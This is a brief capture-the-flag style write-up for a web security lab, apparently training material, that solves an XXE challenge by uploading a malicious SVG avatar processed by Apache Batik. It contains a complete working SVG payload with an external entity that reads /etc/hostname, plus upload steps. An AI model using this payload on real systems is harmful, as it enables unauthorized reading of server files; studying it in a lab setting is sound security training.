This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

1) in post functionality we cna see that we can upload an image and svg is enabled
    svg is based on xml so we can inject an external entity in it 

2) write a post and upload an image done in this way:
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>

    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">

        <text font-size="16" x="0" y="16">&xxe;</text>

    </svg>


    REMEMBER: DOCTYPE must stay not in svg tag

3) open the uploaded image (profile image of the comment) and see the result of the xxe
